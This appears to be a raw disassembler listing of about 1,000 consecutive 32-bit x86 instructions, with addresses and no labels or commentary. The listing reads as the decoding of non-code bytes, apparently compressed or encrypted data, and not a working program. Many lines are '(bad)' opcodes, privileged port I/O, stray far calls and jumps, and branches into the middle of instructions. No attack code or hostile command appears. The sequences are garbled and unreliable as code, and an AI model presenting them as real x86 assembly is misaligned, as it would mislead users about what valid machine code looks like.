  6b010d:	mov    WORD PTR [edi-0x7e17b299],?
  6b0113:	fild   WORD PTR [ebp+0x76]
  6b0116:	or     ebx,DWORD PTR cs:[ecx-0x2fce5d60]
  6b011d:	push   edi
  6b011e:	push   0x41
  6b0120:	jne    0x6b00c3
  6b0122:	adc    eax,0x506622b0
  6b0127:	xchg   edx,eax
  6b0129:	les    ebx,FWORD PTR [esi+0x62a01bae]
  6b012f:	push   edi
  6b0130:	mov    cs,WORD PTR [edx-0x77]
  6b0133:	in     al,dx
  6b0134:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b0135:	push   ecx
  6b0136:	out    0x0,eax
  6b0138:	nop
  6b0139:	ja     0x6b0134
  6b013b:	xchg   ecx,eax
  6b013c:	call   0xe696:0xd7266134
  6b0143:	icebp  
  6b0144:	jl     0x6b011e
  6b0146:	das    
  6b0147:	or     eax,DWORD PTR [edx-0x5f87f028]
  6b014d:	sub    al,0x61
  6b014f:	mov    bl,0xaf
  6b0151:	jg     0x6b0168
  6b0153:	cli    
  6b0154:	dec    esi
  6b0155:	out    dx,eax
  6b0156:	clc    
  6b0157:	push   esi
  6b0158:	push   0xc16be100
  6b015d:	daa    
  6b015e:	sub    al,0x71
  6b0160:	sbb    DWORD PTR [edx-0x1bb7315a],ebp
  6b0166:	mov    edi,0x6d5074b8
  6b016b:	pop    eax
  6b016c:	push   cs
  6b016d:	fnstenv [ebp+edi*2-0x6396844a]
  6b0174:	inc    ecx
  6b0175:	mov    edi,0xf20be895
  6b017a:	mov    ebp,0xda786f92
  6b017f:	aas    
  6b0180:	sub    al,0xfc
  6b0182:	jbe    0x6b017a
  6b0184:	(bad)  
  6b0185:	jbe    0x6b015c
  6b0187:	adc    al,0xbf
  6b0189:	xor    BYTE PTR [edx+ecx*1-0x4556e65c],dl
  6b0190:	push   eax
  6b0191:	fist   DWORD PTR ds:0x5af94aaf
  6b0197:	xor    DWORD PTR [eax-0x10],edx
  6b019a:	mov    eax,DWORD PTR [ecx]
  6b019c:	cmp    dl,ah
  6b019e:	pop    edx
  6b019f:	repnz inc edx
  6b01a1:	push   ds
  6b01a2:	(bad)  [edx]
  6b01a4:	ins    BYTE PTR es:[edi],dx
  6b01a5:	xchg   ebx,eax
  6b01a6:	cmp    dh,BYTE PTR [esi+0x10e92ea1]
  6b01ac:	jne    0x6b01d3
  6b01ae:	cmp    al,bl
  6b01b0:	pusha  
  6b01b1:	mov    edi,0x9fee6c
  6b01b6:	or     al,0xa2
  6b01b8:	jno    0x6b01f4
  6b01ba:	imul   BYTE PTR [ecx]
  6b01bc:	sub    al,0xc0
  6b01be:	not    ebp
  6b01c0:	mov    bl,0xf8
  6b01c2:	nop
  6b01c3:	push   cs
  6b01c4:	in     eax,dx
  6b01c5:	ficomp DWORD PTR [ecx+eiz*2]
  6b01c8:	mov    ch,0xaa
  6b01ca:	sub    DWORD PTR [eax+0x2d86f288],ecx
  6b01d0:	jno    0x6b01b5
  6b01d2:	sar    BYTE PTR [ecx],0x24
  6b01d5:	adc    al,0xa4
  6b01d7:	inc    ebp
  6b01d8:	test   DWORD PTR [edx],ebx
  6b01da:	xchg   esi,eax
  6b01db:	stos   BYTE PTR es:[edi],al
  6b01dc:	fst    QWORD PTR [esi]
  6b01de:	and    ecx,DWORD PTR [ebx]
  6b01e0:	jmp    FWORD PTR ds:0xe3ffe1a0
  6b01e6:	test   eax,0xa909a5a0
  6b01eb:	in     al,0x15
  6b01ed:	push   ss
  6b01ee:	ins    BYTE PTR es:[edi],dx
  6b01ef:	lock pusha 
  6b01f1:	fidiv  DWORD PTR fs:[ecx]
  6b01f4:	cmp    bh,BYTE PTR [edi-0x2cb3262f]
  6b01fa:	mov    eax,ds:0x5a69d8fa
  6b01ff:	out    dx,al
  6b0200:	jmp    0x6b01f9
  6b0202:	push   eax
  6b0203:	inc    esi
  6b0204:	pop    ebx
  6b0205:	or     BYTE PTR [edi],bh
  6b0207:	sbb    al,0xd6
  6b0209:	adc    ah,0x8e
  6b020c:	cmp    eax,0x8c446521
  6b0211:	sub    dl,BYTE PTR [ecx-0x27]
  6b0214:	lods   al,BYTE PTR ds:[esi]
  6b0215:	xchg   ecx,eax
  6b0216:	enter  0x8e54,0x37
  6b021a:	addr16 sbb al,0x3e
  6b021d:	sub    DWORD PTR [esi+edx*2],ebx
  6b0220:	cs dec eax
  6b0222:	jmp    0x6b020c
  6b0224:	imul   ecx,DWORD PTR cs:[ebx+0x6b],0xbe84b5fe
  6b022c:	xchg   ebp,eax
  6b022d:	jl     0x6b022b
  6b022f:	imul   ebx,ebp,0xffffffca
  6b0232:	out    dx,al
  6b0233:	mov    eax,0x2273fcbf
  6b0238:	pop    esi
  6b0239:	jae    0x6b01c6
  6b023b:	mov    ds:0x75da04e4,eax
  6b0240:	cmp    BYTE PTR [edx-0x34],dl
  6b0243:	(bad)  
  6b0244:	cmp    al,0xbc
  6b0246:	(bad)  
  6b0247:	stc    
  6b0248:	xor    al,0xee
  6b024a:	retf   
  6b024b:	mov    ds:0xafbc2771,al
  6b0250:	adc    BYTE PTR [edi+0x61],dl
  6b0253:	mov    ecx,0xddb01ee9
  6b0258:	cmp    DWORD PTR [ebx],ebx
  6b025a:	and    eax,0x3ec8a689
  6b025f:	fisubr WORD PTR [esi+eax*4-0x23]
  6b0263:	mov    esp,0x75cd9010
  6b0268:	aaa    
  6b0269:	daa    
  6b026a:	js     0x6b0299
  6b026c:	cmp    ebx,eax
  6b026e:	xor    bh,bl
  6b0270:	mov    ch,0xd6
  6b0272:	inc    ebp
  6b0273:	or     eax,DWORD PTR [eax*4+0x246adc50]
  6b027a:	dec    ebp
  6b027b:	outs   dx,DWORD PTR ds:[esi]
  6b027c:	jne    0x6b021a
  6b027e:	aas    
  6b027f:	jae    0x6b0245
  6b0281:	inc    esi
  6b0282:	mov    ebx,0x11bc13ad
  6b0287:	ins    DWORD PTR es:[edi],dx
  6b0288:	jl     0x6b02c2
  6b028a:	pop    es
  6b028b:	imul   eax,DWORD PTR [ecx],0xffffff85
  6b028e:	cmp    esi,ebp
  6b0290:	fadd   DWORD PTR [esi+0xd97f6db]
  6b0296:	mov    eax,ds:0xcf94fcc3
  6b029b:	sti    
  6b029c:	sbb    dl,BYTE PTR [edx]
  6b029e:	ds (bad) 
  6b02a0:	cmp    edi,DWORD PTR [ebp+ebp*2-0x22258757]
  6b02a7:	jo     0x6b0305
  6b02a9:	ret    
  6b02aa:	pop    esi
  6b02ab:	inc    edi
  6b02ac:	imul   esi,DWORD PTR [ecx],0xffffffd1
  6b02af:	shl    BYTE PTR [ebp-0x4a],0x2c
  6b02b3:	cmp    eax,0x759bc3fe
  6b02b8:	sar    BYTE PTR [edi],1
  6b02ba:	sbb    esi,DWORD PTR [ebx+0x35ee8e98]
  6b02c0:	and    eax,0x613f45c
  6b02c5:	jmp    0x6b0328
  6b02c7:	xor    dh,BYTE PTR [ecx+eax*1-0x70af0588]
  6b02ce:	inc    edx
  6b02cf:	sbb    bh,0x79
  6b02d2:	or     cl,BYTE PTR [eax+edx*4]
  6b02d5:	fcom   DWORD PTR [edi-0x3b]
  6b02d8:	rcr    DWORD PTR [esi+0x4b],0x85
  6b02dc:	mov    edx,0xf11d543b
  6b02e1:	or     eax,DWORD PTR [bp+di+0x7057]
  6b02e6:	rol    BYTE PTR [edx],1
  6b02e8:	stos   WORD PTR es:[edi],ax
  6b02ea:	pop    edx
  6b02eb:	mov    dl,0x7e
  6b02ed:	xchg   edx,eax
  6b02ee:	inc    ebx
  6b02ef:	imul   edi,edx,0x84d0dfee
  6b02f5:	sbb    bl,BYTE PTR [ebp+ecx*4-0x1cb219dd]
  6b02fc:	push   es
  6b02fd:	lods   al,BYTE PTR ds:[esi]
  6b02fe:	pop    esp
  6b02ff:	pop    ds
  6b0300:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b0301:	xchg   edi,eax
  6b0302:	push   esp
  6b0303:	pop    ds
  6b0304:	and    esi,DWORD PTR [edi+0xc45b9ff]
  6b030a:	cmp    bl,BYTE PTR [edi+ebp*8]
  6b030d:	sub    eax,0x649aeac2
  6b0312:	aam    0x31
  6b0314:	pusha  
  6b0315:	shl    esi,1
  6b0317:	cwde   
  6b0318:	or     ah,BYTE PTR [ecx-0x6d]
  6b031b:	mov    ds:0x8917d898,al
  6b0320:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b0321:	repz mov bl,0x51
  6b0324:	fcom   QWORD PTR [ebp+0x406d73e3]
  6b032a:	mov    ch,BYTE PTR [eax-0x288f4f21]
  6b0330:	dec    edx
  6b0331:	xor    al,0xf8
  6b0333:	mov    ebx,0x40963385
  6b0338:	sahf   
  6b0339:	xchg   esi,eax
  6b033a:	ret    
  6b033b:	pop    ds
  6b033c:	std    
  6b033d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b033e:	jmp    DWORD PTR [edi+edx*2+0x29]
  6b0342:	mov    fs,WORD PTR [esi+0x75]
  6b0345:	mov    ecx,0xf08a119f
  6b034a:	cmp    ch,bl
  6b034c:	out    dx,al
  6b034d:	iret   
  6b034e:	inc    esi
  6b034f:	mov    WORD PTR [esi+0x3f21a747],fs
  6b0355:	pop    ecx
  6b0356:	push   ds
  6b0357:	sbb    al,BYTE PTR [eax]
  6b0359:	jae    0x6b03ba
  6b035b:	(bad)  
  6b035c:	rol    DWORD PTR gs:[edx-0x5d],cl
  6b0360:	xchg   ecx,eax
  6b0361:	xchg   esp,eax
  6b0362:	outs   dx,BYTE PTR ds:[esi]
  6b0363:	sahf   
  6b0364:	imul   esp,DWORD PTR [edi],0x27
  6b0367:	inc    edx
  6b0368:	les    edx,FWORD PTR [edx+0x3eb5da34]
  6b036e:	dec    edx
  6b036f:	pop    esi
  6b0370:	mov    al,0x4d
  6b0372:	test   eax,0x610820af
  6b0377:	inc    esp
  6b0378:	xchg   esp,ebx
  6b037a:	js     0x6b0394
  6b037c:	pushf  
  6b037d:	xchg   ebp,eax
  6b037e:	dec    eax
  6b037f:	mov    BYTE PTR [edi+eax*2],dl
  6b0382:	jb     0x6b0388
  6b0384:	sbb    edx,DWORD PTR [edx-0x51970840]
  6b038a:	inc    edi
  6b038b:	bound  edx,QWORD PTR [ebp+0x31]
  6b038e:	xor    al,0xeb
  6b0390:	mov    al,0x5b
  6b0392:	cld    
  6b0393:	cld    
  6b0394:	popa   
  6b0395:	cwde   
  6b0396:	push   ds
  6b0397:	ss je  0x6b0380
  6b039a:	add    eax,0x369db389
  6b039f:	pop    eax
  6b03a0:	loop   0x6b03c9
  6b03a2:	mov    eax,0x90792ed4
  6b03a7:	xor    eax,0x71b899f3
  6b03ac:	fs sub eax,0x211402ae
  6b03b2:	cmp    DWORD PTR [edx-0x6a],esp
  6b03b5:	pop    edx
  6b03b6:	mov    edx,0x9e5cf7d5
  6b03bb:	mov    bh,0x39
  6b03bd:	std    
  6b03be:	das    
  6b03bf:	xor    al,0xab
  6b03c1:	cmp    esp,ebp
  6b03c3:	(bad)  [eax+esi*1+0x414ad4a2]
  6b03ca:	sbb    eax,0x4ab8e9df
  6b03cf:	xor    edi,ebx
  6b03d1:	fdivr  DWORD PTR [edi-0x32]
  6b03d4:	or     ah,bl
  6b03d6:	sub    ebx,eax
  6b03d8:	cdq    
  6b03d9:	and    BYTE PTR [edx-0x68],ch
  6b03dc:	outs   dx,BYTE PTR ds:[esi]
  6b03dd:	out    0x8b,eax
  6b03df:	into   
  6b03e0:	ja     0x6b03c0
  6b03e2:	lahf   
  6b03e3:	stos   DWORD PTR es:[edi],eax
  6b03e4:	mov    dh,0x51
  6b03e6:	fsubr  QWORD PTR [eax+eiz*1-0x571acd82]
  6b03ed:	add    ah,bh
  6b03ef:	inc    eax
  6b03f0:	ficomp DWORD PTR [eax+0x51]
  6b03f3:	jne    0x6b0451
  6b03f5:	mov    al,ds:0x719642b
  6b03fa:	add    ecx,DWORD PTR [ebx+0x709c4771]
  6b0400:	or     ah,BYTE PTR [ecx-0x74]
  6b0403:	sbb    bh,bl
  6b0405:	xchg   esp,eax
  6b0406:	jo     0x6b03df
  6b0408:	xchg   ebp,eax
  6b0409:	and    eax,0x72a1c2ad
  6b040e:	or     BYTE PTR [ebp-0x206d394c],ch
  6b0414:	imul   esp,DWORD PTR [esi+0x65a974f2],0x46d87f6b
  6b041e:	cmp    ebp,eax
  6b0420:	xor    ah,ah
  6b0422:	stos   DWORD PTR es:[edi],eax
  6b0423:	retf   0x2fc8
  6b0426:	cmp    DWORD PTR [edi+0xd],ebx
  6b0429:	add    BYTE PTR [ebx-0x30b8dcb8],cl
  6b042f:	and    bh,0x93
  6b0432:	and    eax,0xdb6546d0
  6b0437:	dec    DWORD PTR [ebp-0x2a6def7c]
  6b043d:	jmp    0xab2:0xd4f99fa7
  6b0444:	cs xchg ecx,eax
  6b0446:	sbb    bl,BYTE PTR [edi+0x33102d17]
  6b044c:	cmp    eax,DWORD PTR [eax]
  6b044e:	aaa    
  6b044f:	dec    esi
  6b0450:	loope  0x6b03e5
  6b0452:	sbb    DWORD PTR [esi+ecx*1+0x79],eax
  6b0456:	int3   
  6b0457:	sbb    BYTE PTR [ebp-0x717e13ff],ah
  6b045d:	dec    eax
  6b045e:	in     eax,0x50
  6b0460:	clc    
  6b0461:	and    al,0x78
  6b0463:	push   esp
  6b0464:	icebp  
  6b0465:	dec    ebp
  6b0466:	call   0x388160fa
  6b046b:	fist   WORD PTR [ecx+0x46e042a9]
  6b0471:	mov    ebp,0x8c3565e1
  6b0476:	mov    bl,0x7e
  6b0478:	pop    esi
  6b0479:	cmp    ecx,DWORD PTR [edi+eax*4-0x4cd07c2]
  6b0480:	fcmovbe st,st(4)
  6b0482:	cmc    
  6b0483:	adc    eax,0xb40260cf
  6b0488:	inc    eax
  6b0489:	int    0x62
  6b048b:	push   edx
  6b048c:	mov    bh,0xa6
  6b048e:	mov    bh,0x43
  6b0490:	call   0xc2b7:0xe127b51c
  6b0497:	dec    esp
  6b0498:	pop    ss
  6b0499:	sbb    dh,0x74
  6b049c:	add    al,0xc7
  6b049e:	jecxz  0x6b045b
  6b04a0:	add    BYTE PTR [ebp-0x46d5ca58],ah
  6b04a6:	mov    bl,BYTE PTR [edi+0x45]
  6b04a9:	repz mov gs,WORD PTR [edx]
  6b04ac:	cdq    
  6b04ad:	aas    
  6b04ae:	popa   
  6b04af:	mov    dh,BYTE PTR [ecx-0x3f]
  6b04b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b04b3:	retf   0x2c74
  6b04b6:	push   ss
  6b04b7:	fwait
  6b04b8:	pusha  
  6b04b9:	jp     0x6b0472
  6b04bb:	sbb    edi,DWORD PTR [ebx+0x2d4a833d]
  6b04c1:	lea    eax,[edx]
  6b04c3:	nop
  6b04c4:	dec    ecx
  6b04c5:	mov    dl,0x1e
  6b04c7:	mov    al,0xe8
  6b04c9:	rcl    DWORD PTR fs:[esi+0x6024de38],0x1a
  6b04d1:	(bad)
  6b04d5:	mov    edx,edx
  6b04d7:	outs   dx,BYTE PTR ds:[esi]
  6b04d8:	add    DWORD PTR [eax+0x178559ed],ecx
  6b04de:	dec    esi
  6b04df:	inc    edx
  6b04e0:	pop    ss
  6b04e1:	sub    DWORD PTR [edi-0x50d44b47],0x3b4fadc1
  6b04eb:	sbb    BYTE PTR [eax-0x248647f4],dl
  6b04f1:	cmp    bh,BYTE PTR [edx+0x2]
  6b04f4:	mov    esi,DWORD PTR [esi]
  6b04f6:	push   esi
  6b04f7:	rol    dl,0xbf
  6b04fa:	mov    bl,0xcf
  6b04fc:	dec    ecx
  6b04fd:	ins    BYTE PTR es:[edi],dx
  6b04fe:	aad    0x7f
  6b0500:	jae    0x6b0569
  6b0502:	call   0x53862dd1
  6b0507:	push   ds
  6b0508:	popf   
  6b0509:	cmp    ecx,ebp
  6b050b:	and    eax,DWORD PTR [ebx]
  6b050d:	jno    0x6b0512
  6b050f:	sub    edi,DWORD PTR [ecx+0x73]
  6b0512:	pusha  
  6b0513:	sbb    ecx,DWORD PTR [edi-0xd]
  6b0516:	xlat   BYTE PTR ds:[ebx]
  6b0517:	adc    eax,DWORD PTR [ecx]
  6b0519:	cld    
  6b051a:	fcomi  st,st(3)
  6b051c:	jmp    0x6b0534
  6b051e:	and    DWORD PTR [edi+0x675277af],ebp
  6b0524:	js     0x6b0556
  6b0526:	test   BYTE PTR [ecx-0x13bb8d16],dl
  6b052c:	jo     0x6b04b9
  6b052e:	fadd   QWORD PTR [ebx]
  6b0530:	aas    
  6b0531:	popf   
  6b0532:	jbe    0x6b0521
  6b0534:	push   ss
  6b0535:	mov    edi,0xbeac75b0
  6b053a:	cld    
  6b053b:	jbe    0x6b0512
  6b053d:	sbb    eax,0x51d921b4
  6b0542:	jecxz  0x6b04d6
  6b0544:	imul   esi,DWORD PTR [ebx],0xffffffe4
  6b0547:	mov    ?,WORD PTR [esi+0x466a6b3a]
  6b054d:	fistp  WORD PTR [edx-0x471f872a]
  6b0553:	mov    al,ds:0xbcb47cde
  6b0558:	mov    fs,WORD PTR [edi-0x53aa0a03]
  6b055e:	dec    esp
  6b055f:	sbb    BYTE PTR [edx-0x17fe365f],bh
  6b0565:	pop    edi
  6b0566:	adc    ch,cl
  6b0568:	test   BYTE PTR [edx+0x60],cl
  6b056b:	and    BYTE PTR [esp+ebp*2-0xa],ah
  6b056f:	mov    cl,0x5a
  6b0571:	push   ebx
  6b0572:	std    
  6b0573:	jmp    0x6b05d7
  6b0575:	rcl    DWORD PTR [esi+ecx*8-0x784ccd61],1
  6b057c:	or     al,0x56
  6b057e:	mov    cl,0xfd
  6b0580:	(bad)  
  6b0581:	mov    eax,0x357ba457
  6b0586:	(bad)  
  6b0587:	(bad)
  6b058b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b058c:	loope  0x6b05f2
  6b058e:	and    ecx,DWORD PTR [eax]
  6b0590:	mov    edx,esi
  6b0592:	outs   dx,BYTE PTR ds:[esi]
  6b0593:	pusha  
  6b0594:	add    BYTE PTR [esi-0x7da15c10],ch
  6b059a:	adc    BYTE PTR [edi],0x8f
  6b059d:	add    ecx,DWORD PTR [edi-0xe]
  6b05a0:	dec    ebx
  6b05a1:	cdq    
  6b05a2:	mov    edi,0x9f0add9a
  6b05a7:	adc    DWORD PTR [ebp+0x0],eax
  6b05aa:	and    BYTE PTR [esi+0x56d4f2d5],ch
  6b05b0:	push   ebp
  6b05b1:	lock loopne 0x6b05a2
  6b05b4:	sub    esi,esp
  6b05b6:	mov    esp,0x5af95fa5
  6b05bb:	inc    eax
  6b05bc:	outs   dx,BYTE PTR ds:[esi]
  6b05bd:	rcl    DWORD PTR [edi],cl
  6b05bf:	test   DWORD PTR [ebp+esi*8-0x78],edi
  6b05c3:	mov    edx,0x8890c8fb
  6b05c8:	neg    edx
  6b05ca:	loopne 0x6b05ec
  6b05cc:	out    dx,al
  6b05cd:	aad    0x4a
  6b05cf:	mov    DWORD PTR [ebx+0x545780fd],edi
  6b05d5:	rcr    BYTE PTR [ebp+edi*2-0x743cf73b],0x4a
  6b05dd:	pop    esp
  6b05de:	scas   al,BYTE PTR es:[edi]
  6b05df:	test   DWORD PTR [edx],eax
  6b05e1:	push   cs
  6b05e2:	mov    ch,0x81
  6b05e4:	in     eax,dx
  6b05e5:	mov    edi,0xd50c3e52
  6b05ea:	adc    eax,0x48962d8f
  6b05ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b05f0:	jb     0x6b0599
  6b05f2:	mov    ch,0x8e
  6b05f4:	imul   esi,DWORD PTR [ebx+0x48],0x74d414c9
  6b05fb:	and    BYTE PTR [ebx-0x43a894c],bl
  6b0601:	push   es
  6b0602:	je     0x6b05b9
  6b0604:	imul   ebx,eax,0x1f
  6b0607:	sahf   
  6b0608:	ss jecxz 0x6b05f6
  6b060b:	pusha  
  6b060c:	aas    
  6b060d:	mov    esi,0xe25c8f32
  6b0612:	iret   
  6b0613:	xchg   esp,eax
  6b0614:	lods   al,BYTE PTR ds:[esi]
  6b0615:	jle    0x6b065b
  6b0617:	mov    ah,0x44
  6b0619:	les    esi,FWORD PTR [ebx]
  6b061b:	hlt    
  6b061c:	xlat   BYTE PTR ds:[ebx]
  6b061d:	ins    DWORD PTR es:[edi],dx
  6b061e:	push   esp
  6b061f:	sahf   
  6b0620:	or     eax,0x325ae2f1
  6b0625:	jecxz  0x6b05fd
  6b0627:	or     ebx,0x551f837d
  6b062d:	dec    esp
  6b062e:	dec    esi
  6b062f:	jl     0x6b05e4
  6b0631:	mov    BYTE PTR [ecx-0x32afb69c],bh
  6b0637:	inc    ebp
  6b0638:	push   0x1d6c6af8
  6b063d:	inc    eax
  6b063e:	mov    WORD PTR [ecx+0x1b],ss
  6b0641:	pop    DWORD PTR [ebp-0xa]
  6b0644:	mov    edx,0x40d65371
  6b0649:	cwde   
  6b064a:	loope  0x6b05e0
  6b064c:	dec    edx
  6b064d:	mov    ch,0x8e
  6b064f:	addr16 xchg esi,eax
  6b0651:	lock in eax,dx
  6b0653:	and    dh,BYTE PTR [esi-0x66ae6089]
  6b0659:	mov    eax,0xf1a8fa91
  6b065e:	xchg   ebp,eax
  6b065f:	je     0x6b06b7
  6b0661:	or     dh,BYTE PTR [edi]
  6b0663:	xchg   ecx,eax
  6b0664:	mov    edi,DWORD PTR [ebx-0x29]
  6b0667:	sbb    eax,DWORD PTR [esp+eax*1+0x35087a9d]
  6b066e:	dec    edx
  6b066f:	in     eax,dx
  6b0670:	test   DWORD PTR [eax+ecx*8+0x4d],ebx
  6b0674:	and    BYTE PTR [ebx+ebp*4],bl
  6b0677:	xchg   ecx,eax
  6b0678:	dec    ebp
  6b0679:	loope  0x6b06a2
  6b067b:	es (bad) 
  6b067d:	add    edi,esp
  6b067f:	sbb    DWORD PTR [esi+0x78],edi
  6b0682:	mov    al,0xdd
  6b0684:	and    eax,0xf8dd4b79
  6b0689:	cmp    al,0x54
  6b068b:	xchg   ebp,eax
  6b068c:	call   0xb41ff194
  6b0691:	shr    DWORD PTR [ecx-0x376824b8],0x91
  6b0698:	inc    edi
  6b0699:	add    dh,dh
  6b069b:	push   edx
  6b069c:	ins    DWORD PTR es:[edi],dx
  6b069d:	push   ds
  6b069e:	xchg   ebx,eax
  6b069f:	xchg   BYTE PTR [ebx-0x20dce049],ah
  6b06a5:	inc    ebx
  6b06a6:	pop    ss
  6b06a7:	xchg   esi,eax
  6b06a8:	nop
  6b06a9:	daa    
  6b06aa:	rcl    BYTE PTR [edi-0x40],cl
  6b06ad:	sub    BYTE PTR [edx-0x38e2d81e],ah
  6b06b3:	test   DWORD PTR [edx-0x4e],esp
  6b06b6:	pop    ebp
  6b06b7:	shl    DWORD PTR [edx],0x79
  6b06ba:	ret    
  6b06bb:	pusha  
  6b06bc:	jb     0x6b071e
  6b06be:	add    ah,BYTE PTR [edi+0x21]
  6b06c1:	pop    edx
  6b06c2:	dec    esp
  6b06c3:	jmp    0xaff8:0xbe5784d0
  6b06ca:	lods   al,BYTE PTR ds:[esi]
  6b06cb:	push   esp
  6b06cc:	iret   
  6b06cd:	cli    
  6b06ce:	xor    edx,DWORD PTR [ecx]
  6b06d0:	repnz pop esp
  6b06d2:	push   ebx
  6b06d3:	ss jp  0x6b066a
  6b06d6:	sub    BYTE PTR [ebp-0x160c9f99],ch
  6b06dc:	dec    esp
  6b06dd:	(bad)  
  6b06de:	imul   esi,DWORD PTR ds:[ebx],0x48
  6b06e2:	xchg   BYTE PTR [esi],bl
  6b06e4:	cmp    ch,dl
  6b06e6:	jmp    0x13ca46d6
  6b06eb:	xchg   ecx,eax
  6b06ec:	rcl    DWORD PTR [edx+0xc],0x18
  6b06f0:	in     eax,0x52
  6b06f2:	mov    dh,0x49
  6b06f4:	or     al,0xf9
  6b06f6:	out    0xb9,eax
  6b06f8:	jbe    0x6b0752
  6b06fa:	(bad)  
  6b06fb:	loopne 0x6b06eb
  6b06fd:	push   cs
  6b06fe:	hlt    
  6b06ff:	jle    0x6b06ee
  6b0701:	outs   dx,BYTE PTR ds:[esi]
  6b0702:	push   ss
  6b0703:	and    edi,DWORD PTR [ebx*4-0x1f2a42a2]
  6b070a:	rcl    BYTE PTR [edi+0x7173d8c3],1
  6b0710:	in     al,0x93
  6b0712:	mov    cs,WORD PTR [ebp+eax*4-0x42d2df6d]
  6b0719:	popa   
  6b071a:	(bad)  
  6b071b:	xlat   BYTE PTR ds:[ebx]
  6b071c:	out    dx,eax
  6b071d:	addr16 daa 
  6b071f:	jecxz  0x6b0737
  6b0721:	popf   
  6b0722:	push   cs
  6b0723:	stos   DWORD PTR es:[edi],eax
  6b0724:	cld    
  6b0725:	js     0x6b072a
  6b0727:	pop    ds
  6b0728:	mov    ecx,DWORD PTR [ecx+0x5f]
  6b072b:	inc    esi
  6b072c:	adc    eax,0xfc221916
  6b0731:	lahf   
  6b0732:	repz arpl bp,sp
  6b0735:	mov    BYTE PTR [edx-0x572e452a],bl
  6b073b:	inc    ebx
  6b073c:	test   bh,0x39
  6b073f:	stos   BYTE PTR es:[edi],al
  6b0740:	or     bl,dl
  6b0742:	mov    ebx,esp
  6b0744:	inc    esp
  6b0745:	push   ss
  6b0746:	jb     0x6b077c
  6b0748:	xor    al,0xc1
  6b074a:	into   
  6b074b:	jl     0x6b0710
  6b074d:	lds    edi,FWORD PTR [ebp-0x379c4e4c]
  6b0753:	xchg   BYTE PTR [ecx-0xd1b913d],ah
  6b0759:	mov    bh,0xd3
  6b075b:	stos   BYTE PTR es:[edi],al
  6b075c:	dec    esi
  6b075d:	or     edx,eax
  6b075f:	mov    DWORD PTR [edi],edi
  6b0761:	xchg   esi,eax
  6b0762:	and    DWORD PTR [eax+0x3d],0xffffff8d
  6b0766:	fcom   QWORD PTR [ebp+0x46]
  6b0769:	mov    esi,0x5bee006c
  6b076e:	cmp    esi,ebp
  6b0770:	shl    BYTE PTR [esi-0x3ca626e2],0x52
  6b0777:	(bad)  
  6b0778:	(bad)  
  6b0779:	and    al,0x4d
  6b077b:	fs dec edi
  6b077d:	jg     0x6b0712
  6b077f:	pop    es
  6b0780:	dec    DWORD PTR [ecx]
  6b0782:	xchg   BYTE PTR [eax+eax*8+0x3693d4ba],ch
  6b0789:	outs   dx,BYTE PTR ds:[esi]
  6b078a:	lock push cs
  6b078c:	mov    ds:0xa1ffb177,al
  6b0791:	cmp    DWORD PTR [eax+0x282e1a88],ecx
  6b0797:	and    al,0xcc
  6b0799:	shl    dl,1
  6b079b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b079c:	inc    esp
  6b079d:	adc    al,0xee
  6b079f:	retf   
  6b07a0:	shr    dh,0x3d
  6b07a3:	add    BYTE PTR [esi-0x33a058],al
  6b07a9:	xor    DWORD PTR [ecx+0x4],esp
  6b07ac:	inc    ebx
  6b07ad:	shl    BYTE PTR [edx+0x33],1
  6b07b0:	mov    DWORD PTR [eax],ebp
  6b07b2:	cmp    al,0xee
  6b07b4:	jp     0x6b0763
  6b07b6:	inc    eax
  6b07b7:	inc    ebx
  6b07b8:	pop    edi
  6b07b9:	scas   al,BYTE PTR es:[edi]
  6b07ba:	xchg   bh,ah
  6b07bc:	mov    dl,0x44
  6b07be:	cmp    BYTE PTR [eax],dl
  6b07c0:	mov    bl,0x37
  6b07c2:	mov    eax,0xd3f4a29d
  6b07c7:	enter  0x24b1,0x7f
  6b07cb:	jne    0x6b07f8
  6b07cd:	jp     0x6b0836
  6b07cf:	mov    ah,0xab
  6b07d1:	xchg   esi,eax
  6b07d2:	enter  0x3f13,0xa3
  6b07d6:	ins    DWORD PTR es:[edi],dx
  6b07d7:	sub    bh,BYTE PTR [edx]
  6b07d9:	psubb  mm4,QWORD PTR [eax-0x6dfbb845]
  6b07e0:	(bad)  
  6b07e1:	leave  
  6b07e2:	xchg   ebp,eax
  6b07e3:	cdq    
  6b07e4:	lods   eax,DWORD PTR ds:[esi]
  6b07e5:	push   ecx
  6b07e6:	inc    ebp
  6b07e7:	mov    bl,BYTE PTR [eax]
  6b07e9:	pop    esi
  6b07ea:	(bad)  
  6b07eb:	in     eax,dx
  6b07ec:	mov    ds:0xf7524d59,al
  6b07f1:	dec    ebp
  6b07f2:	les    esi,FWORD PTR [edi-0x1a7b84c6]
  6b07f8:	(bad)  
  6b07f9:	imul   edi,DWORD PTR [ebx],0xffffff8a
  6b07fc:	jmp    0x6b087a
  6b07fe:	mov    edi,0xb85638e5
  6b0803:	mov    al,0xa5
  6b0805:	sub    dl,BYTE PTR [ecx+0x39b22fc8]
  6b080b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b080c:	shl    BYTE PTR [esi+0x2cf9a472],1
  6b0812:	cmc    
  6b0813:	and    esp,DWORD PTR [esp+ebx*1+0x3e]
  6b0817:	or     al,0x99
  6b0819:	sahf   
  6b081a:	mov    ecx,0x10db8777
  6b081f:	or     al,0x46
  6b0821:	xchg   esi,eax
  6b0822:	inc    edx
  6b0823:	div    DWORD PTR [ecx+0x21b288a0]
  6b0829:	ds xchg ecx,eax
  6b082b:	pop    ds
  6b082c:	pop    ebp
  6b082d:	inc    edx
  6b082e:	mov    al,ds:0x96a525bc
  6b0833:	jle    0x6b07e0
  6b0835:	retf   0xc0ac
  6b0838:	int3   
  6b0839:	sbb    edx,DWORD PTR [ecx+0xe809f8e]
  6b083f:	stos   BYTE PTR es:[edi],al
  6b0840:	(bad)  
  6b0841:	jge    0x6b0817
  6b0843:	mov    ds:0xe31290b,al
  6b0848:	inc    esi
  6b0849:	sub    esp,DWORD PTR [eax+0x1b78133]
  6b084f:	ror    DWORD PTR [ebx+0x7a],cl
  6b0852:	nop
  6b0853:	not    ebp
